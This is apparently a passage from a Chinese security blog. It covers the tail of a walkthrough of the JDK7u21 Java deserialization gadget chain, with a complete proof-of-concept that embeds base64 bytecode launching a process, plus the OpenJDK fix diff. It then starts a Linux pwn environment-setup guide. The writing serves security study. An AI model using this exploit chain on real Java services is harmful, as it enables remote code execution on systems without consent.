&#125;</span><br><span class="line">        <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们不难想到如果构造一个 <code>AnnotationInvocationHandler</code> 使得其 <code>type</code> 为 <code>Templates.class</code> 然后将 <code>TemplatesImpl</code> 对象传入便会调用它的 <code>getOutputProperties</code> 方法实现恶意字节码加载。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>equalsImpl</code> 方法可以通过 <code>AnnotationInvocationHandler#invoke</code> 方法调用。也就是说如果我们使用 <code>AnnotationInvocationHandler#invoke</code> 代理一个类，然后调用这个类的 <code>equals</code> 方法就可以触发 <code>AnnotationInvocationHandler#equalsImpl</code> 方法调用，且传入的参数是 <code>equals</code> 的参数。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">    <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">        paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>HashSet</code> 内部实际上是通过 <code>HashMap</code> 来实现的，我们存入 <code>HashSet</code> 中的数据实际上是存入内部成员 <code>private transient HashMap&lt;E,Object&gt; map;</code> 的键中，而对应的值设为一个 <code>Object</code> 类型的对象来占位（<del>真够懒的</del>）。因此在 <code>HashSet#readObject</code> 函数中我们会把 <code>HashSet</code> 存储的元素逐个加到 <code>HashMap</code> 中。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>HashMap</code> 中会计算哈希值找到对应的桶然后逐个比较去重，最后放到 <code>HashMap</code> 中。这里涉及到了 <code>equals</code> 方法的调用。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object k)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       </span><br><span class="line">       ...</span><br><span class="line">       </span><br><span class="line">       h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">       <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">       <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">       h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">       <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">           <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">       <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">       <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">       <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">           Object k;</span><br><span class="line">           <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">               <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">               e.value = value;</span><br><span class="line">               e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">               <span class="keyword">return</span> oldValue;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       modCount++;</span><br><span class="line">       addEntry(hash, key, value, i);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>因此如果我们在 <code>HashSet</code> 中放一个 <code>TemplatesImpl</code> 对象再放一个 <code>AnnotationInvocationHandler</code> 代理的对象，并且恰巧这两个对象的哈希值相等且 <code>AnnotationInvocationHandler</code> 代理的对象是后加入的，那么调用 <code>equals</code> 方法就会触发前面介绍的利用链。</p>
<p>所以现在的问题是如何构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得其哈希值与 <code>TemplatesImpl</code> 对象相等。</p>
<p>由于 <code>TemplatesImpl</code> 没有显式实现 <code>hashCode()</code> 方法，因此它将继承自 <code>java.lang.Object</code> 类中的默认实现。在这种情况下，调用 <code>hashCode()</code> 方法返回的是该对象的内存地址经过哈希计算后得到的一个整数值。也就是说这个哈希值我们不可控制。</p>
<p>但是我们可以想办法构造一个 <code>AnnotationInvocationHandler</code> 代理的对象使得它的哈希值总是与 <code>TemplatesImpl</code> 对象的哈希值相等。 </p>
<p><code>AnnotationInvocationHandler</code> 代理的对象的 <code>hashCode</code> 方法实际上调用的是 <code>AnnotationInvocationHandler#invoke</code> 进而会调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code>。</p>
<p>这个方法会遍历 <code>memberValues</code> 这个 <code>Map</code> 中的每个 <code>key</code> 和 <code>value</code>，计算每个 <code>(127 * key.hashCode()) ^ value.hashCode()</code> 并求和。因此我们只要让 <code>value</code> 为<strong>同一个</strong> <code>TemplatesImpl</code> 且 <code>key</code> 的哈希值为 0 即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">        result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">            memberValueHashCode(e.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>网上通常的做法是枚举十六进制数字对应的字符串，最终得到 <code>f5a5a608</code> 这个字符串。但实际上根据字符串的哈希计算方式很容易就构造出 <code>\0</code> 这一字符串。</p>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADMANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACBMY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAvAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAF0hlbGxvVGVtcGxhdGVzSW1wbC5qYXZhDAAKAAsHADAMADEAMgEABGNhbGMMADMANAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgA1AQAeY29tL2V4YW1wbGUvSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAALAA4AAAAMAAEAAAAFAA8AEAAAAAEAEQASAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAXAA4AAAAgAAMAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAFwAAAAQAAQAYAAEAEQAZAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAcAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAGgAbAAIAAAABABwAHQADABcAAAAEAAEAGAAIAB4ACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAADgAJABEADAAPAA0AEAAWABIADgAAAAwAAQANAAkAHwAgAAAAIQAAAAcAAkwHACIJAAEAIwAAAAIAJA==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;sky123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span>  clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">proxy</span> <span class="operator">=</span> (Serializable) Proxy.newProxyInstance(Serializable.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Serializable.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;\0&quot;</span>, templates);</span><br><span class="line">        System.out.println(proxy.hashCode());</span><br><span class="line">        System.out.println(templates.hashCode());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(set);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:136, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:339, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:376, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:410, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:431, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">equalsImpl:197, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:59, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">equals:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">put:475, HashMap (java.util)</span><br><span class="line">readObject:309, HashSet (java.util)</span><br><span class="line">...</span><br><span class="line">main:48, JDK7u21 (com.example)</span><br></pre></td></tr></table></figure></div>
<p> <a class="link"   href="https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350" >https://hg.openjdk.org/jdk7u/jdk7u/jdk/rev/0ca6cbe3f350 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Fri Mar 22 15:40:16 2013 -0400</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java Mon Mar 25 12:41:55 2013 +0400</span></span><br><span class="line"><span class="meta">@@ -1,5 +1,5 @@</span></span><br><span class="line"> /*</span><br><span class="line"><span class="deletion">- * Copyright (c) 2003, 2011, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line"><span class="addition">+ * Copyright (c) 2003, 2013, Oracle and/or its affiliates. All rights reserved.</span></span><br><span class="line">  * DO NOT ALTER OR REMOVE COPYRIGHT NOTICES OR THIS FILE HEADER.</span><br><span class="line">  *</span><br><span class="line">  * This code is free software; you can redistribute it and/or modify it</span><br><span class="line"><span class="meta">@@ -337,12 +337,15 @@</span></span><br><span class="line">         try &#123;</span><br><span class="line">             annotationType = AnnotationType.getInstance(type);</span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line"><span class="deletion">-            // Class is no longer an annotation type; all bets are off</span></span><br><span class="line"><span class="deletion">-            return;</span></span><br><span class="line"><span class="addition">+            // Class is no longer an annotation type; time to punch out</span></span><br><span class="line"><span class="addition">+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span></span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        // If there are annotation members without values, that</span></span><br><span class="line"><span class="addition">+        // situation is handled by the invoke method.</span></span><br><span class="line">         for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>linux user pwn 基础知识</title>
    <url>/2024/11/07/linux-user-pwn-basic-knowlege/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><ul>
<li><a class="link"   href="http://old-releases.ubuntu.com/releases/" >镜像下载网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>为了避免环境问题建议 22.04 ，20.04，18.04，16.04 等常见版本 ubuntu 虚拟机环境各准备一份。注意定期更新快照以防意外。</li>
<li>虚拟机建议硬盘 256 G 以上，内存也尽量大一些。硬盘大小只是上界，256 G 不是真就占了 256 G，而后期如果硬盘空间不足会很麻烦。</li>
<li>更换 <a class="link"   href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" >ubuntu 镜像源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，建议先在 <code>系统设置 → Software &amp; Updates → Download from → 选择国内服务器例如阿里云</code>（貌似不这样后续换源会出错），然后再 <code>sudo gedit /etc/apt/sources.list</code> 将镜像源中<strong>不高于</strong>当前系统版本的镜像复制进去（高于当前系统版本容易把 <code>apt</code> 搞坏）。</li>
<li>Ubuntu 换源 error：The following signatures couldn’t be verified because the public key is not available 解决方法：<code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 5523BAEEB01FA116</code> 其中的<code>5523BAEEB01FA116</code> 是根据错误提示写的。</li>
</ul>
<h2 id="基础工具"><a href="#基础工具" class="headerlink" title="基础工具"></a>基础工具</h2><h3 id="net-tools"><a href="#net-tools" class="headerlink" title="net-tools"></a>net-tools</h3><p><code>ifconfig</code> 查看网络配置需要安装 <code>net-tools</code> 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install net-tools</span><br></pre></td></tr></table></figure></div>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install vim</span><br></pre></td></tr></table></figure></div>
<h3 id="gedit"><a href="#gedit" class="headerlink" title="gedit"></a>gedit</h3><p>不习惯 vim 的可以使用 gedit 文本编辑器。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gedit</span><br></pre></td></tr></table></figure></div>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install git</span><br></pre></td></tr></table></figure></div>
<h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gcc</span><br><span class="line"><span class="built_in">sudo</span> apt install gcc-multilib</span><br></pre></td></tr></table></figure></div>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>ipython 提供了很好的 python 交互命令行，建议安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python2</span><br><span class="line"><span class="built_in">sudo</span> apt install python3</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython</span><br><span class="line"><span class="built_in">sudo</span> apt install ipython3</span><br></pre></td></tr></table></figure></div>
<p>另外有的版本 ubuntu 的不好安装 pip2 可以使用 <code>get-pip.py</code> 脚本安装。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install python3-pip</span><br><span class="line"><span class="built_in">sudo</span> apt  install curl</span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py</span><br><span class="line"><span class="built_in">sudo</span> python2 get-pip.py</span><br></pre></td></tr></table></figure></div>
<p>ubuntu 22.04 的 ipython（python2）必须使用 pip2 安装：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pip2 install ipython</span><br></pre></td></tr></table></figure></div>
<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install docker.io</span><br><span class="line"><span class="built_in">sudo</span> apt install docker-compose</span><br></pre></td></tr></table></figure></div>
<p>默认情况下，Docker 命令需要使用 sudo 权限才能运行，这是因为 Docker 守护进程以 root 用户身份运行。然而，你可以通过以下步骤将当前用户添加到 Docker 用户组，从而允许在不使用 sudo 的情况下运行 Docker 命令：</p>
<ul>
<li><p>确保当前用户属于 <code>docker</code> 组：运行以下命令检查当前用户是否已添加到 docker 组：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">groups</span></span><br></pre></td></tr></table></figure></div>
<p>在输出的组列表中查找 <code>docker</code>。如果没有找到 <code>docker</code> 组，请继续下一步。</p>
</li>
<li><p>将当前用户添加到 <code>docker</code> 组：运行以下命令将当前用户添加到 <code>docker</code> 组中（将 <code>&lt;username&gt;</code> 替换为你的用户名）：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker &lt;username&gt;</span><br></pre></td></tr></table></figure></div></li>
<li><p>更新用户组更改：运行以下命令使用户组更改生效：</p>
  <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">newgrp docker</span><br></pre></td></tr></table></figure></div></li>
<li><p>重新登录或重启系统：要使用户组更改永久生效，你需要注销当前会话并重新登录，或者重启系统。</p>
</li>
</ul>
<h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><p>安装 zsh</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install zsh</span><br></pre></td></tr></table></figure></div>
<p>安装 <a class="link"   href="https://ohmyz.sh/#install" >oh-my-zsh <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>设置 zsh 为默认 shell（重启虚拟机后生效）</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure></div>
<p>安装 oh-my-zsh 插件 <a class="link"   href="https://github.com/zsh-users/zsh-autosuggestions/blob/master/INSTALL.md" >zsh-autosuggestions  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   href="https://github.com/zsh-users/zsh-syntax-highlighting" >zsh-syntax-highlighting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
